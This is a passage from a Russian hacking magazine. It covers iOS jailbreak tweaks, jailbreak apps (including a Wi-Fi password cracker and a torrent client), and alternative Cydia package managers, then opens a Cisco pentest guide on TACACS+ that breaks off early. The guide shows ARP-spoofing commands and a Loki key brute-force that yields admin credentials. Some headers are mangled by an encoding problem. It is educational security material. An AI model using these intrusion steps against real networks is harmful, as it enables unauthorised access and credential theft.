можность удалить отту да кнопки камеры и фонарика, три точки, отображающие
твое перемещение по вклад кам экрана, и даже над пись Swipe Up to Unlock.
   Счастливых владель цев девайсов под управлением iOS 11 HomeGesture
пораду ет еще парочкой интересных возможностей, а имен но:
 • от ключение жестов для экранной клавиату ры;
 • черный список приложений. Сюда можно включить  все приложения,
   для которых ты не хочешь исполь зовать изменение внеш него вида и дру гие
   возможности твика;
 • от ключение жестов твика для выбранных тобой приложений.


ACTIVATOR
Один из наиболее известных твиков. Он позволяет назначить действия
в интерфейсе операционной системы при помощи аппарат ных ком понен тов
айфона — дисплея, акселеромет ра, перек лючателей. Из-за его популярности
многие джейлбрейк-разработ чики уже на протяжении несколь ких лет создают
плагины, которые можно под ключить толь ко через Activator. Чтобы их прос-
мотреть, нажми кнопку «Боль ше действий» в меню настроек этого твика.
  Список возможностей самого «Активатора» весь ма обширен. По прин ципу
действия твик напоминает встроенное в iOS приложение «Коман ды», но «Акти-
ватор» гораздо более простой и инту итивно понят ный в исполь зовании. Воз-
можные действия поль зователя в настройках разделены на несколь ко катего-
рий:
 • ак селерометр — пот рясти телефон;
 • домаш ний экран — провести по значку вверх, вниз, вправо, влево, а так же
   развести и свести паль цы, коснувшись экрана;
 • кнопка «Сон» — различные виды нажатия (двойное, длин ное, корот кое),
   так же нажатие одновремен но с кнопками управления гром костью;
 • кнопки гром кости — включить, вык лючить, нажать одну, вторую или обе
   сразу, удерживать кнопки;
 • жесты муль титач — касание экрана и жесты с исполь зованием несколь ких
   паль цев;
 • включение и отключение питания.

К каждому из этих действий можно привязать реак цию. Какую? Да прак тически
любую, выбор ограничивает ся толь ко твоей фан тазией. Можно управлять про-
игры ванием аудио и гром костью зву ка, заставить камеру сделать снимок,
открыть произволь ный раздел из меню настроек (в том числе и настроек тви-
ков), заблокировать экран, запустить любое приложение, поставить таймер
или будиль ник, включить или вык лючить Bluetooth, авиарежим, фонарик, VPN,
даже создать пустое сообщение элек трон ной почты или пост в соцсетях. И еще
очень, очень много всего на любой вкус и цвет. В общем, если ты хочешь, что-
бы, падая на кафель ный пол, твой айфон чик отправил тебе прощаль ный твит,
исполь зуй Activator c привязкой этого действия к акселеромет ру.





                                        Activator

Количество всевозможных настроек здесь настоль ко огромно, что напоминает
инструк цию к антидепрессан там, толь ко в отличие от последних, наоборот,
вгоняет в депрессию. Терпения и времени попробовать весь набор фун кций
мне не хватило, но я верю, что ты освоишь все без исключения возможности
Activator!


REALCC
Ког да ты отключаешь Wi-Fi или Bluetooth в цен тре управления iOS, они
на самом деле не вырубаются, а лишь прек ращают поиск сети и сбрасывают
все под ключения, но продолжают работать в фоне, высаживая батарею. Испра-
вить это поможет RealCC.
  Обычно для полного отключения сети требует ся зайти в настройки и вос-
поль зовать ся соот ветству ющими перек лючателями. После установки RealCC
полностью вык лючить Wi-Fi и Bluetooth можно прямо в цен тре управления,
при этом ты будешь уверен, что они действитель но реаль но вырублены.





                             RealCC

Визуаль но разница вид на даже в том, как под свечиваются вык лючен ные кноп-
ки с твиком и без него. Твик, к слову, не отображается в меню настроек, но так
даже лучше — его и настраивать не надо.


SHORTLOOK
Твик меняет  систему  уведом лений на  заблокирован ном  экране.  Давай
говорить откровен но: стан дартные уведом ления в iOS страш ны, как сон алко-
голика. ShortLook добавляет при их появлении эффект анимации: икон ка уве-
дом ления плавно увеличивает ся, а рядом демонстрирует ся превью самого
сообщения-уведом ления. Выг лядит это приколь но, классно, сим патично…
в общем, вставь сюда еще 25 восторжен ных слов.





                                ShortLook


TOLDYOUPREFERENCES
Расширение позволяет выводить любое задан ное тобой сообщение в стиле
стан дартного системного уведом ления на экран заблокирован ного смартфона,
если ввести неправиль ный пароль или неправиль но сработают Touch ID и Face
ID. Персонаж, попытавшийся угадать твой пароль, чтобы полазить в чужом
телефоне, будет очень силь но удивлен. Я бы даже сказала, фрустрирован
(что бы это умное слово ни значило).





                      Так работает ToldYouPreferences

Так же в составе твика есть фун кция, с помощью которой можно заставить бед-
ную Сири наговорить гадостей твоему недоброжелателю. Простым и понят ным
русским матом. Кроме того, фрон таль ная камера в момент неправиль ного
ввода пароля сделает снимок злоумыш ленника, дабы окон чатель но испортить
его безупречную репутацию.


ÂÛÂÎÄÛ
Для чего люди вообще делают на своем телефоне джейлбрейк? Причин может
быть несколь ко.
 1. Чтобы вдоволь наиг рать ся со старым железом и исполь зовать устаревшие
   версии приложений, отсутству ющие в App Store.
 2. Чтобы установить пират ские версии софта, за который не можешь зап-
   латить из-за сан кций или по причине «нету денех».
 3. Для твикин га и украшатель ства iOS, если юзеру не хватает стан дартного
   набора фун кций.

С украшатель ствами мы в сегод няшней статье благополучно разобрались.
В следующий раз поговорим об интересных приложениях, которые можно
добыть из недр Cydia.
COVERSTORY





          СТАВИМ САМЫЕ ИНТЕРЕСНЫЕ
             ПРИЛОЖЕНИЯ ДЛЯ IOS С
                   ДЖЕЙЛБРЕЙКОМ




Для  чего  вла дельцы  айфо нов  дела ют
джей лбрейк? Конеч но же, что бы улуч шить
и укра сить интерфейс системы с помощью
мно гочисленных тви ков. Но, помимо это-
го,  джей лбрейк  поз воля ет  уста новить       Валентин Холмогоров                                                                        Ведущий редактор "Хакера".
на телефон мно жество полез ных при ложе-         valentin@holmogorov.ru
ний, которых нет и никог да не будет в офи-
циальном App Store. Сегод ня мы рассмот-
рим самые интересные из них.


В прош лой статье мы уже писали о том, что на айфон с джейлбрейком можно
скачать множество твиков, позволяющих менять скры тые настройки iOS
и добавлять в интерфейс системы всевозможные украшатель ства. Однако,
как говаривал Квазимодо, одной красоты для полного счастья недостаточно.
  Менед жер пакетов Cydia откры вает доступ к широчайшему ассортимен ту
приложений от независимых разработ чиков, которые ты совершенно точно
не найдешь в App Store. Прежде всего потому, что боль шинство из них исполь-
зует возможности джейлбрейка — на обычном iPhone или iPad такие фун кции
попросту отсутству ют. Сегод ня мы разберем несколь ко самых интересных
и полезных прог рамм, которые точно пойдут на iPhone с iOS 12.5.5 и на более
новых девайсах.




                        Cydia — это менед жер .deb-пакетов, который поз-
                        воля ет уста навливать на iPhone и iPad с джей-
                      лбрей ком прог раммы из сторонних репози тори ев.
                     При выпол нении джей лбрей ка с использовани ем
                       большинс тва стандартных методов это при ложе-
                      ние  появляет ся  на  телефоне  автомати чес ки.
                 О том, как взломать айфон и уста новить на него
                          Cydia, читай в «Хакере»:
                      •Как сломать яблоко. Пошаговая  инс трукция
                        по джей лбрей ку iOS 12
                   •Шах и мат! Как устроен нашумевший экс плоит
                       checkm8 и как им вос пользоваться



FILZA

Каждый поль зователь ком па — неважно, «яблочного» или любого дру гого, —
твердо знает: самая главная прог рамма в его операционной системе —
это пась янс «Косын ка» файловый менед жер. В iOS файлового менед жера нет,
потому что у поль зователя, в общем-то, нет доступа к файловой системе: стан-
дартное приложение Files показы вает толь ко содержимое несколь ких папок
на самом устройстве, в iCloud Drive и в дру гих облачных хранилищах. Можно ли
это назвать полноцен ным инстру мен том для работы с файлами? Вопрос
риторический.





                Файловый менед жер для iOS Filza

А вот прог рамма  Filza, которую можно установить на взломан ный айфон
из Cydia, откры вает полный доступ ко всем хранящим ся на устройстве папкам
и файлам, включая системные. С помощью Filza тебе станут доступны все
стан дартные операции с файловыми объектами, включая перенос, переиме-
нование, удаление и копирование с исполь зованием буфера обмена. Кроме
того, приложение имеет боль шое количество настроек: начиная от внеш него
вида (можно включить отображение файлов и папок в стиле Windows, macOS
или Linux) и закан чивая тон кой настройкой интерфейса.
   Прог рамма, к слову, стоит 5,99 доллара и оплачивается с помощью PayPal,
но все основные фун кции для работы с файлами и папками доступны с проб-
ной лицен зией. Filza позволит тебе заг лянуть в самые пыль ные закоулки твоего
айфона. Так что, если вдруг однажды ты решишь почистить телефон от всякого
хлама и заод но отправить \boot\ в \dev\null, Filza тебе обязатель но в этом
поможет.


ICLEANER

Кстати, про очистку от хлама. Поль зователи Windows прек расно знакомы
с CCleaner — утилитой, способной решать множество полезных задач: удалять
времен ные и ненужные файлы, чистить кеш, следить за поль зователями
и даже распространять малварь . Аналог дан ной тулзы для взломан ной iOS —
iCleaner.





                   iCleaner — утилита для уборки мусора iOS

Это приложение призвано убирать мусор в iOS и удалять ненужные файлы,
которые ты выбираешь по категориям: вложения в сообщениях мессен джеров,
кеш Safari, обновления операционной системы, журналы, времен ные файлы,
статистика акку мулятора... В отдель ном окне настроек можно указать при-
ложения, дан ные которых не будут очищены. Прог рамма тоже плат ная (сто-
имость — 4,99 евро), но прек расно работает и в бесплат ном режиме, правда
настырно показы вает при этом рек ламу.


MTERMINAL

Если ты настоящий хакер, тебе точно не обойтись без терминала. А на айфоне
с джейлом вполне можно исполь зовать этот инстру мент, было бы желание!





                  MTerminal — эму лятор терминала для iOS

Я перепробовал разные эму ляторы терминала из доступных в Cydia — на моем
телефоне завелся толь ко MTerminal, пред ставляющий собой форк широко
известного в узких кру гах Mobile Terminal (который, к слову, работать наот рез
отказался). Терминал запускает ся от имени поль зователя mobile и позволяет
выполнять основной набор кон соль ных команд. Настроек в этой утилите
не предусмотрено никаких, но, несмотря на это, поль зовать ся ей вполне мож-
но. Разве что шрифт мелковат.


IWEP PRO

Эта прог рамма пред назначена для взлома паролей Wi-Fi и тестирования уяз-
вимостей беспровод ных сетей.
  Приложение исполь зует известные уязвимости в протоколах WEP и WPA,
а так же в прошивках популярных роутеров, чтобы подобрать пароль к беспро-
вод ной сети. Тип роутера определяется автоматически: запустив прог рамму,
просто выбери в списке одну из доступных беспровод ных сетей  (Wi-Fi
на айфоне должен быть, разумеется, включен) и нажми значок  i рядом с нуж-
ным тебе SSID.





  iWep Pro — прог рамма для тестирования беспровод ных сетей и под бора
  паролей

Если уязвимостей для этой сети не обнаружит ся, в разделе Password Exploit
в нижней части экрана будет написано Not Supported. В противном слу чае
можно попытать ся подобрать  пароль, нажав на над пись  Press  to  start.
Для моего вайфая прог рамма уязвимостей не наш ла, для сосед ских, к сожале-
нию, тоже, зато смога отыскать поблизости две скры тые сети, о существо-
вании которых я рань ше даже не подозревал.


SNAPBACK

Каждый поль зователь вин ды прек расно знает, как работает утилита «Восста-
новление системы». Тулза создает так называемые точки восстановления,
выбрав одну из которых можно вернуть Windows в то состояние, в котором она
была на момент создания этой точки. Примерно то же самое делает приложе-
ние SnapBack на айфоне. А посколь ку для работы ему требует ся непосредс-
твен ный доступ к файловой системе APFS от Apple, без джейлбрейка тут
не обойтись.





   SnapBack — тулза для создания «момен таль ных сним ков» состояния iOS

Джейлбрейк позволяет SnapBack создавать «момен таль ные сним ки» сос-
тояния iOS от имени суперполь зователя root. При первом запуске приложение
автоматически сохранит снапшот под именем orig-fs — это оригиналь ный сни-
мок, который был сделан самой ОС либо прямо перед первым джейлбрейком,
либо при последнем обновлении. Следующие точки восстановления можно
создавать вручную и присваивать им любые имена. При необходимости
получит ся вернуть смартфон в исходное состояние, выбрав нужный снап-
шот, — это бывает очень полезно, если ты установил на свой айфон какую-то
прог рамму из Cydia, которая «сломала» нормаль ную работу системы.


AIRSHOU

AirShou Screen Recorder — это прог рамма для видеозаписи экрана в iOS.
Записы вать можно как в портрет ной, так и в аль бом ной ориентации, выбрав
требуемое качество видео: 480p, 640p, 720 или 1080p. Приложение записы-
вает звук в стерео и сохраняет итоговый файл в формате MP4.





                          AirShou Screen Recorder

Получен ные записи можно исполь зовать, например, чтобы создать обу чающие
ролики или продемонстрировать игровой процесс. По боль шому счету джей-
лбрейк для работы AirShou необязателен, но это приложение доступно в Cydia,
и его можно установить отту да, минуя App Store.


ITRANSMISSION

iTransmission — один из самых популярных торрент-клиентов для устройств
iPhone и iPad. Если ты всег да мечтал превратить свой айфон в торрентокачалку
и просматривать на нем пират ские филь мы с «Рут рекера», iTransmission —
это то, что тебе нужно.





                    iTransmission — торрент-клиент для iOS

Приложение под держивает iOS версий 10–14 и включает прак тически все фун-
кции, присущие обычному торрент-клиенту. Для начала заг рузки торрента нуж-
но ввести в приложение URL файла .torrent или Magnet-ссылку. А можно
просто открыть встроенный в iTransmission браузер и отыскать нужный линк
прямо там. В настройках ты можешь задать порт, указать скорость закачки
и раздачи, выбрать мак сималь ное количество соединений, возобновить при-
остановленные или прерванные заг рузки.
  В окне iTransmission демонстрируют ся сведения о торрент-файлах, включая
их размер, количество пиров, скорость закачки, число доступных фраг ментов.
Там же можно просматривать содержимое торрентов и редак тировать список
трекеров. Прог рамма позволяет откры вать торрент-ссылки прямо из Safari,
а скачан ные файлы сохраняются в выбранную папку, содержимое которой ты
можешь просмотреть, например, с помощью Filza.


FLEX 3

Эта прог рамма пред назначена для создания собствен ных твиков на айфонах
с джейлбрейком. Приложение плат ное, но версия 3, пред ставленная в виде
публичной беты, лежит в Cydia в халявном доступе — любой желающий может
скачать ее и установить на своем девайсе.





             Flex 3 — приложение для создания собствен ных твиков

Прог рамма позволяет выбрать приложения на телефоне — как стан дартные
из ком плек та поставки iOS, включая основное приложение «Настройки», так
и установленные позже — и создать для них патч с твиками и дополнитель-
ными опциями. Выбрав приложение в списке и нажав на его значок, ты узна-
ешь, что в нем можно изменить. Например, в некоторых прог раммах для iOS
есть возможность отключить обязатель ное требование об оплате или разбло-
кировать некоторые фун кции, недоступные в деморежиме. Весь ма полезный
инстру мент, не так ли?


SUCCESSION

Это приложение удаляет все изменения, внесен ные в устройство после джей-
лбрейка, и позволяет вернуть iOS к «стоковому» состоянию, в котором система
находилась изначаль но. Очень полезная фун кция, которая может пригодить ся
тебе, если ты слиш ком увлекся твиками и залез в глу бокие настройки телефо-
на своими шаловливыми ручками.





                     Succession — все можно вернуть!

С Succession у тебя всег да остается шанс начать все с чистого листа и снова
сделать джейлбрейк, не сбрасывая девайс к завод ским настройкам штат ными
методами. Так же Succession дает возможность удалить приложение Cydia,
если это не получается сделать иначе.




                      Будь осторожен! Этот инс тру мент уда лит все
                     данные на устрой стве, если ты не включишь
                        в нас трой ках опцию «Только вос ста новление сис-
                      темных данных» (Only Restore System Data).



ÂÛÂÎÄÛ

Приложений, которые можно установить на айфон с джейлбрейком, великое
множество. В этой статье мы крат ко рассмот рели толь ко самые популярные
и интересные из них. Многие из пред ставленных в Cydia прог рамм — плат ные,
некоторые под держивают исключитель но старые версии iOS, дру гие и вовсе
могут «завесить» телефон, отправив его в режим «вечного яблока» (у меня
однажды слу чилась такая неприят ность: приш лось заг ружать айфон в Recovery
Mode и заливать в него чистую прошивку с помощью iTunes). Поэтому при уста-
новке приложений из сторон них источников следует соблюдать определен ную
осмотритель ность.
   Ну а если ты не нашел в Cydia нужного тебе приложения, можно под ключить
дополнитель ные репозитории, список которых нет рудно отыскать в интернете.





 1. Открой Cydia и нажми кнопку «Источники» в нижней части окна.
 2. Нажми над пись «Добавить» слева вверху.
 3. Введи URL репозитория в открывшемся окне и нажми «Добавить».





              Добавление новых репозиториев в Cydia




Если тебе недостаточно и этого, можно установить аль тернативные магазины
приложений, аналогичные Cydia, — каждый из них отличает ся своими особен-
ностями и возможностями. Однако это уже тема для отдель ной статьи.
COVERSTORY





     ВЫБИРАЕМ ÀËÜÒÅÐÍÀÒÈÂÓ
            ДЛЯ CYDIA





Основное преиму щество Cydia по срав-
нению со стан дар тным магази ном при-
ложений для iOS — App Store — зак люча-
ется в воз можности под клю чать сто рон ние
репози тории. Если какое-то при ложение       Валентин Холмогоров                                                                        Ведущий редактор "Хакера".
отсутству ет в настро енных по умол чанию         valentin@holmogorov.ru
хра нили щах,  оно  навер няка  най дет ся
во внеш них. Но новых вер сий Cydia уже
дав но не выходит, а с последни ми редак-
циями iOS это при ложение работа ет нес-
табильно. Одна ко есть выход: на айфон
с джей лбрей ком можно уста новить альтер-
натив ные пакет ные менед жеры, о которых
мы сегод ня и погово рим.




                 О том, как сделать джей лбрейк и как он работа-
                           ет, мы рас ска зыва ли  в  статье  « Шах и  мат!
                       Как устроен нашумевший экс плоит checkm8 и как
                   им вос пользоваться ». Об использовании тви ков,
                       позволя ющих  менять  скрытые  нас трой ки  iOS
                      и добавлять в интерфейс сис темы всевозможные
                         укра шательства,  рас ска зыва ет  статья   « Cydia
                       2022. Укра шаем iOS с джей лбрей ком при помощи
                     неофи циальных тви ков». Самые интерес ные при-
                     ложения для айфонов с джей лбрей ком опи саны
                        в матери але « Cydia 2022. Ста вим самые инте-
                       рес ные при ложения для iOS с джей лбрей ком».


Все, кто сталкивался с джейлбрейком, знают, как работает Cydia. Операци-
онная система iOS пред ставляет собой разновид ность Unix. В официаль ном
магазине App Store приложения хранят ся в виде архивных файлов с рас-
ширением .ipa, имеющих цифровую под пись. По боль шому счету .ipa —
это ZIP-архив, внут ри которого прячет ся исполняемый файл.
  А еще iOS понимает бинарные файлы формата .deb, пришед шие в продук-
цию Apple из ОС семейства Debian, правда, установить их можно толь ко
на телефон с джейлбрейком. Для работы с ними в iOS есть система управле-
ния пакетами dpkg — она исполь зует ся при установке, удалении .deb-пакетов
и получении информации о них. Так вот, можно сказать, что Cydia — это гра-
фическая надстройка над этой утилитой. И почти все аль тернативные «магази-
ны приложений» для взломан ных айфонов устроены в точности  так  же,
при этом каждый имеет свои особен ности. Им и посвящен наш сегод няшний
обзор.
   Для  установки  боль шинства  аль тернативных  магазинов  приложений
с помощью Cydia в ней необходимо под ключить дополнитель ные репозитории.
Делается это так:
 1. Открой Cydia и обнови приложение, если оно об этом попросит.
 2. Нажми кнопку «Источники» в нижней части окна.
 3. Нажми над пись «Правка» в правой верхней части окна, затем «Добавить»
   слева вверху.
 4. Введи URL репозитория в открывшемся окне и нажми «Добавить».


SILEO

Чтобы установить приложение Sileo, в Cydia нужно добавить репозиторий
https://repo.getsileo.app. Затем в списке источников Cydia выбери Sileo,
в одноимен ном разделе — «Все пакеты». На этом экране присутству ет толь ко
один пункт — Sileo. Нажми «Изменить», затем «Установить», «Принять» и дож-
дись завершения установки. Значок приложения появит ся на экране твоего
iPhone.





                           Установка Sileo

Внеш не Sileo боль ше напоминает привычный нам App Store, чем Cydia.
На главном экране демонстрирует ся список самых популярных приложений,
внизу — несколь ко кнопок: избран ные приложения, перечень новых пакетов,
недавно добавленных в Sileo, «Источники» — при установке прог рамма «под-
хватывает» под ключен ные репозитории из Cydia, «Пакеты» — здесь собрана
информация об уже установленных на твоем устройстве пакетах — и, наконец,
«Поиск». Как и в Cydia, эта волшебная кнопка позволяет найти интересу ющее
тебя приложение среди доступных в репозиториях.





                                       Sileo

Ук рашает этот менед жер пакетов папка «Список желаний» (прямо как в Steam,
да?) — ссылка на нее появляет ся в правой верхней части экрана. Во время
поиска сюда можно добавлять приложения, которые тебя заин тересовали,
но которые ты пока не готов установить на своем iPhone, например из-за
дефицита свобод ного места.
   Sileo может похвастать ся более стиль ным и акку рат ным интерфейсом, чем
Cydia, что и неудивитель но: новых версий Cydia не выходило уже доволь но
давно, и это приложение имеет ограничен ную совместимость с новыми вер-
сиями iOS, в то время как Sileo работает на них без проблем. По ощу щениям,
приложения из Sileo заг ружаются и устанавливаются гораздо быстрее. Кроме
того, ходят упорные слу хи, что эти два пакет ных менед жера кон флик туют друг
с дру гом, но существу ют твики, позволяющие им работать вместе на одном
устройстве. У меня они оба завелись без всяких дополнитель ных тан цев с буб-
ном и работают вполне стабиль но.


ZEBRA

Zebra — это не толь ко забавная полосатая лошад ка, но еще и доволь но
популярный пакет ный менед жер, который можно установить из Cydia. Для это-
го нужно под ключить репозиторий https://getzbra.com/repo (да, в этом
URL нет бук вы e, и это не очепят ка!), а затем действовать стан дартно: зайти
в окно репозитория непосредствен но в Cydia, выбрать «Все пакеты → Zebra →
Изменить → Установить → Принять».
  Ин терфейс этого магазина приложений весь ма лаконичен. В нижней части
экрана — ссылка на главную страницу, список источников пакетов, страничка
с описанием последних изменений в прог рамме, перечень уже установленных
пакетов и, конечно же, поиск.





                                 Zebra

По умолчанию в «Зебре» отсутству ют под ключен ные репозитории (толь ко ее
собствен ный, в котором ничего, кроме самой «Зебры», нет). Чтобы добавить
новое хранилище пакетов, перейди в раздел «Источники», нажми кнопку + сле-
ва вверху и введи соот ветству ющий URL. После добавления репозиториев при-
ложением можно поль зовать ся в точности так же, как и дру гими менед жерами
пакетов, — существен ных отличий тут нет.
  Многие считают Zebra лучшим пакет ным менед жером для iOS с джей-
лбрейком из-за лаконичного интерфейса и возможностей гибкой настройки.
Если нажать на значок шестерен ки в правом верхнем углу на главном экране
Zebra, откроется окно, в котором можно поменять множество парамет ров при-
ложения — начиная от цвета оформления и икон ки и закан чивая филь трами
пакетов:  настроить  порядок  установки  приложений  и  твиков,  включить
или отключить автоматическое обновление, а так же восполь зовать ся дру гими
опциями. Более того, Zebra полностью переведена на русский язык, что делает
интерфейс приложения еще удобнее.





                         Настройки Zebra


INSTALLER 5

Еще одна  аль тернатива  Cydia:  этот  пакет ный менед жер  устанавливают
из репозитория https://apptapp.me/repo. При первом запуске приложения
оно пред ложит тебе войти в аккаунт AppTapp, но можно пропустить этот шаг,
нажав на малозамет ную ссылку «Я хочу исполь зовать Installer без входа» в ниж-
ней части экрана. В следующем окне есть возможность импортировать
репозитории и настройки из дру гих установленных на устройстве пакет ных
менед жеров, что, сог ласись, очень удобно — не придет ся вбивать их вручную.





                     Первый запуск Installer 5

Внеш не магазин приложений оформлен стиль но и приятно. В традиционной
для менед жеров пакетов iOS нижней панели присутству ют следующие значки:
 • «Главная» — основной экран приложения с под борками «Лучшие твики»,
   «Лучшие темы» и расширениями для установленных приложений;
 • «Изменения» — перечень недавно обновлен ных и установленных пакетов;
 • «Разделы» — список твиков и приложений, рассортирован ных по темам;
 • «Управление» — перечень под ключен ных репозиториев (здесь можно
   добавить новый, нажав кнопку »);
 • «Искать» — поиск приложения по названию.





                     Ин терфейс Installer 5

Поиск в Installer 5 организован достаточно удобно: например, можно искать
все твики от какого-либо разработ чика по его имени вне зависимости от того,
в каких репозиториях они расположены, так же есть возможность выбирать вер-
сию твика или приложения для установки. История поиска сохраняется в жур-
нале. Перед скачиванием пакета приложение предупреждает о возможных
проблемах с совместимостью и показы вает необходимые для его работы
зависимости.
    Installer 5 может работать на устройстве вместе с Cydia, Sileo и Zebra,
никаких кон флик тов замечено не было.


SAILY

Saily — это простой и быстрый менед жер пакетов для iOS 13 и более новых
версий. Приложение доступно в репозитории http://apt.thebigboss.org/
repofiles/cydia/, официаль ную страничку разработ чиков можно отыскать
по адресу https://sailyteam.github.io/.
  При первом запуске утилита так же пред лагает импортировать все источни-
ки из Cydia, Zebra, Installer и Sileo. Можно было бы сказать, что очеред ной клон
дру гих аналогичных проектов, если бы не одна архитек турная особен ность:
в отличие от Cydia, базиру ющегося на dpkg,  Saily является надстройкой
над под системой APT (advanced packaging tool) — еще одним инстру мен том
для управления пакетами из Debian.





                       Ин терфейс Saily

Первое, что бросает ся в глаза при исполь зовании Saily, — красивый современ-
ный интерфейс. В этом менед жере пакетов пред ставлены в основном твики,
но приложения тоже есть. Как заверяют разработ чики, для покупки плат ного
кон тента в Saily встроена собствен ная безопасная платежная система. Среди
дру гих интересных опций — возможность слу чайным образом под менять
передаваемую «наружу» информацию об устройстве, чтобы сохранить аноним-
ность.
  Ин терфейс Saily стан дартен для менед жеров пакетов: главная страница
демонстрирует список избран ных пакетов из репозиториев, последние уста-
новленные пакеты и последние обновления. Отсюда можно перейти на стра-
ницу настроек, нажав на значок шестерен ки в правом верхнем углу. Установ-
ленные пакеты отображаются в виде простого списка, отсортирован ного
по дате, но метод сортировки можно изменить, например по имени пакета
или дате последнего изменения. Ну и конечно, в прог рамме присутству ет
поиск, позволяющий найти нужный твик или прог рамму в под ключен ных
репозиториях.
    Saily может работать параллель но с дру гими менед жерами пакетов, но для
запуска приложению необходима iOS 13, с более ран ними версиями системы
он несовместим.


ÂÛÂÎÄÛ

Нель зя сказать, что любителям джейлбрейка нужны сразу все описан ные
в этой статье менед жеры пакетов, но их существование дает возможность
выбора. Безусловно, устаревшая и доволь но мед литель ная Cydia требует
замены, и ты вполне можешь установить вместо нее имен но то, что тебе нра-
вит ся: Sileo, Zebra, Installer 5 или Saily. Говорят, что создатель Cydia Джей Фри-
ман (Saurik) давным-давно забросил свое детище. К тому же все эти аль тер-
нативы под стегивают кон курен цию и держат в тонусе разработ чиков, заставляя
их совершенствовать и обновлять свои продук ты. Это и называется звучным
словом «прог ресс».
ВЗЛОМ





                                  Magama Bazarov
                                            Network Security Expert
                                          necreas1ng@gmail.com



    БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ
            СЕТЕЙ CISCO



За всю свою карьеру сетево го инженера я повидал немало
сетей, где использовалось обо рудо вание Cisco. И в боль-
шинстве слу чаев это обо рудо вание работа ло с кон фигура-
цией по умол чанию, что ста вит локальную сеть под боль-
шой удар со сто роны потен циального наруши теля. Из этой
статьи ты узна ешь, какой кош мар может воз никнуть в сетях
Cisco, если к их настрой ке отнеслись халат но.




                       Статья имеет озна коми тельный характер и пред-
                       назна чена для специалис тов по безопас нос ти,
                       проводя щих тес тирова ние в рамках контракта.
                       Автор и  редакция  не  несут  ответс твеннос ти
                        за любой  вред, при чиненный  с при менением
                       изложенной информа ции. Рас прос тра нение вре-
                      донос ных прог рамм, нарушение работы сис тем
                      и  нарушение  тай ны  перепис ки  прес леду ются
                      по закону.



ÏÅÐÅÕÂÀÒ È ÄÅØÈÔÐÎÂÊÀ ÊËÞ×À TACACS+

TACACS+ (Terminal Access Controller Access Control System) — протокол, пред-
назначен ный  для  цен трализован ного  оперирования  учет ными  записями,
которые исполь зуют ся непосредствен но для администрирования сетевого
оборудования. Сервер TACACS+ решает, позволить или запретить доступ
поль зователю, который пытается войти в панель управления сетевым оборудо-
ванием.
   У этого протокола есть две версии: TACACS и TACACS+. Мы будем раз-
бирать ся имен но с TACACS+.
  «Плюсовая»  версия  отличает ся  повышен ным  уровнем  безопасности
и интегрирован ным шифрованием. Так же разделены фун кции AAA (аутен-
тификация, авторизация и учет), и их можно исполь зовать по отдель ности.
   Если злоумыш ленник сумеет встать посередине между клиентом и сер-
вером TACACS, он сможет перехватить ключ для аутен тификации в зашиф-
рован ном виде, а потом провести против него локаль ный брут форс. То есть ты
и брут форсишь ключ, и в логах не палишь ся. И если тебе удастся сбру тить
ключ, то ты сможешь получить доступ к сетевому оборудованию и расшифро-
вать трафик в Wireshark. Да, Wireshark умеет работать с дву мя версиями про-
токола TACACS. Предоставив «Аку ле» ключ, ты сможешь дешифровать осталь-
ную часть дан ных, в которой хранит ся логин поль зователя.


Øàã 1: MITM-àòàêà
Сперва нужно провести MITM-атаку, тут все зависит от обстоятель ств и твоих
пред почтений. Для примера я реализую ARP-спу финг в отношении TACACS-
аген та и TACACS-сервера.
 • В качестве аген та TACACS выступит ком мутатор SW1 с IP-адресом 10.10.
  100.10.
 • В качестве сервера TACACS выступит TACACSGUI с адресом 10.10.100.
  70.

ARP-спу финг я реализую через утилиту Ettercap. Для начала необходимо
перек лючить интерфейс в неразборчивый режим и разрешить маршру тизацию:


necreas1ng@Inguz:~$ sudo ifconfig eth0 promisc
necreas1ng@Inguz:~$ sudo sysctl -w net.ipv4.ip_forward= 1

Запускаем Ettercap:


necreas1ng@Inguz:~$ sudo ettercap -G





                                    Ettercap

В качестве прослушивающего интерфейса выступит eth0. Запустим сканиро-
вание хостов.





                       Сканирование хостов

Target 1 будет хост с IP-адресом 10.10.100.10, а Target 2 — 10.10.100.70.
  Проводим ARP-спу финг против двух целей.





                      Начало ARP-спу фин га


Øàã 2: Loki
Теперь необходимо запустить Loki . Это специаль ный инстру мент, созданный
для анализа безопасности протоколов L2/L3. По возможностям он не хуже той
же популярной Yersinia и составляет ей серь езную кон курен цию. Loki так же
умеет брут форсить ключи TACACS. В слу чае успеха брут форса ключа в зашиф-
рован ном виде (обычно он зашифрован в формате MD5) мы сможем получить
доступ к оборудованию и расшифровать зашифрован ный TACACS-трафик.
  Запускаем Loki:


necreas1ng@Inguz:~$ sudo loki_gtk.py

Вы бираем интерфейс для атаки.





                               Loki. Выбор интерфейса

Так же нужно указать путь до словаря, чтобы провести брут форс зашифрован-
ного ключа. Обязатель но снимай галочку с опции Use Bruteforce, иначе Loki
будет ломать пароль полным перебором, не задействовав сам словарь.





                     Настройка пути до словаря

Теперь нужно ждать, пока легитим ный администратор войдет на устройство
через сервер TACACS. Пред полагается, что сетевой администратор уже зашел,
а мы, встав посередине через ARP-спу финг, перехватываем трафик. И при
этом легитим ные хосты не понимают, что в их соединение вмешался кто-то
посторон ний.





                Локи обнаружил соединение TACACS

Теперь нажимаем на кнопку CRACK и ждем, пока Loki ломанет пароль.





            Локи взломал ключ TACACS. Пароль: secret1234

От лично, нам удалось сбру тить ключ, теперь нужно расшифровать TACACS-
трафик. Как я и сказал, Wireshark умеет работать с зашифрован ным трафиком
TACACS при наличии ключа.





                     Скармливаем «Аку ле» ключ

Видим, какой бан нер исполь зовался.





                   Исполь зовавшийся бан нер

Обнаруживаем логин поль зователя admin.





В итоге у нас есть креды admin:secret1234, с которы ми можно зайти на само
оборудование. Пожалуй, проверю их на валид ность.





             Успешная аутен тификация на оборудовании SW1

Вот таким образом можно атаковать TACACS+ и получать доступ к панели
управления сетевым оборудованием.


ÀÒÀÊÈ ÍÀ ÏÐÎÒÎÊÎË CDP

CDP (Cisco Discovery Protocol) — разработ ка инженеров Cisco Systems, про-
токол каналь ного уровня, созданный для того, чтобы устройства мог ли обме-
нивать ся  информацией. CDP  может  помочь  сетевому  администратору
и облегчить процесс траблшу тин га, но для злоумыш ленника... Сейчас выяс-
ним.


Ñáîð èíôîðìàöèè
По умолчанию CDP выполняет рассылку объявлений на все свои порты. Но что,
если злоумыш ленник под ключит ся в порт того же ком мутатора? Восполь зовав-
шись сетевым сниффером, будь то Wireshark или tcpdump, он сможет извлечь
цен ную информацию о самом устройстве — начиная его моделью и закан чивая
